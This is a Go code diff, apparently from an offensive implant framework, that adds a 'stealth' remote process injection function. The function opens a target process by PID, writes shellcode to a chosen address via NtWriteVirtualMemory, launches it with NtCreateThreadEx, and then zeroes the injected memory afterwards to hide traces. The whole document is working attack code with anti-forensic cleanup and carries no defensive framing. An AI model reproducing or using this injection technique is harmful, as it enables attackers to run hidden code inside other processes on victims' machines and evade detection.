@@ -6,6 +6,7 @@ package processinjection
 import (
 	"bufio"
 	"errors"
+	"fmt"
 	"log"
 	"os/exec"
 	"strconv"
@@ -286,6 +287,67 @@ func RawSelfInject(shellcode []byte) (string, error) {
 	windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
 	winapi.HeapDestroy(heap)
 	return "[+] Success", nil
+}
+
+func memsetLoop(a []byte, v byte) {
+	for i := range a {
+		a[i] = v
+	}
+}
+
+func RemoteInjectStealth(shellcode []byte, pid string, addresstoinject string) (string, error) {
+	// since we have address we just
+	intpid, err := strconv.Atoi(pid)
+	if err != nil {
+		return "", err
+	}
+	// convert address to uintptr remove 0x if there
+	if strings.HasPrefix(addresstoinject, "0x") {
+		addresstoinject = strings.Split(addresstoinject, "0x")[1]
+	}
+	u, err := strconv.ParseUint(addresstoinject, 16, 64)
+	if err != nil {
+		return "", err
+	}
+	hProcess, err := winapi.OpenProcess(windows.MAXIMUM_ALLOWED, 0, uint32(intpid))
+	if hProcess == 0 {
+		return "", err
+	}
+	baseAddressPtr := uintptr(unsafe.Pointer(uintptr(u)))
+	var wrote uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), baseAddressPtr, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(len(shellcode)), &wrote)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(hProcess))
+		return "", err
+	}
+	var remoteThread uintptr
+	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
+		&remoteThread,           //hthread
+		0x1FFFFF,                //desiredaccess
+		0,                       //objattributes
+		uintptr(hProcess),       //processhandle
+		uintptr(baseAddressPtr), //lpstartaddress
+		0,                       //lpparam
+		uintptr(0),              //createsuspended
+		0,                       //zerobits
+		0,                       //sizeofstackcommit
+		0,                       //sizeofstackreserve
+		0,                       //lpbytesbuffer
+	)
+	if err4 != nil {
+		windows.CloseHandle(windows.Handle(hProcess))
+		return "", err
+	}
+	go func() {
+		// we wait for it to finish then zero the memory to set it back to normal
+		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
+		memsetLoop(shellcode, 0)
+		rawapi.NtWriteVirtualMemory(uintptr(hProcess), uintptr(baseAddressPtr), uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(len(shellcode)), &wrote)
+		windows.CloseHandle(windows.Handle(remoteThread))
+		windows.CloseHandle(windows.Handle(hProcess))
+		shellcode = nil
+	}()
+	return fmt.Sprintf("[+] Silently Jabbed Pid %s at %p\n", pid, unsafe.Pointer(baseAddressPtr)), nil
 }
 
 func LoadPE(shellcode []byte, args []string) (string, error) {
